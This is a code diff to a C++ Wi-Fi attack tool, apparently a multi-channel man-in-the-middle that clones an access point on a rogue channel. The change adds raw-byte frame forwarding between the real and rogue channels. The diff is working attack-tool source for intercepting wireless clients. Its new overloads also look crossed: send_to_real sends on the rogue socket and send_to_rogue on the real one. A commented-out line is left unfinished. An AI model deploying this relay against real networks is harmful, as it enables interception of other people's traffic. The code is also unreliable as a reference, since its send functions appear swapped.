@@ -43,27 +43,27 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
     if(dot11.find_pdu<Dot11Deauthentication>()) del_client(dot11.addr1());
 }
 
-bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const Dot11 &dot11) const{
+bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const std::vector<unsigned char> &raw, const Dot11 &dot11) const{
     if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return false;
     if(dot11.wep()){
         if(addr2 == ap_mac){
             log(LogLevel::DEBUG, "Real channel: encrypted Action -> rogue channel");
-            send_to_rogue(pdu);
+            send_to_rogue(raw);
             return true;
         }
     }
 
-    const auto raw = const_cast<Dot11&>(dot11).serialize();
-    if(raw.size() < 25) return false;
-    const uint8_t category = raw[24];
+    const auto serialization = const_cast<Dot11&>(dot11).serialize();
+    if(serialization.size() < 25) return false;
+    const uint8_t category = serialization[24];
 
     if(category == 0){
         log(LogLevel::DEBUG, "Dropping Action frame category=0 (Spectrum Management)");
         return true;
     }
 
-    const HWAddress<6> src(raw.data() + 10);
-    const HWAddress<6> dst(raw.data() + 4);
+    const HWAddress<6> src(serialization.data() + 10);
+    const HWAddress<6> dst(serialization.data() + 4);
 
     if(src == ap_mac && clients.contains(dst)){
         log(LogLevel::DEBUG, "Real channel: Action(cat={}) → rogue channel", category);
@@ -121,7 +121,15 @@ void McMitm::handle_auth_from_client_real(const Dot11Authentication &auth) {
 }
 
 void McMitm::send_to_real(PDU &pdu) const{ sock_real->send(pdu, netconfig.real_channel); }
+void McMitm::send_to_real(const std::vector<uint8_t> &raw) const{
+    sock_rogue->send(raw, netconfig.rogue_channel);
+}
+
+//void McMitm::send_to_real(const std::vector<uint8_t> &raw) const { sock_real->send(, netconfig.real_channel); }
 void McMitm::send_to_rogue(PDU &pdu) const{ sock_rogue->send(pdu, netconfig.rogue_channel); }
+void McMitm::send_to_rogue(const std::vector<uint8_t> &raw) const{
+    sock_real->send(raw, netconfig.real_channel);
+}
 
 void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_t> &raw){
     auto *dot11 = pdu->find_pdu<Dot11>();
@@ -133,7 +141,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
     }
 
     if (handle_probe_real(addr2, *dot11)) return;
-    if(handle_action_real(addr2, *pdu, *dot11)) return;
+    if(handle_action_real(addr2, *pdu, raw, *dot11)) return;
     //if(handle_eapol(addr2, addr1, *dot11)) return;
 
     if(dot11->addr1() == ap_mac){
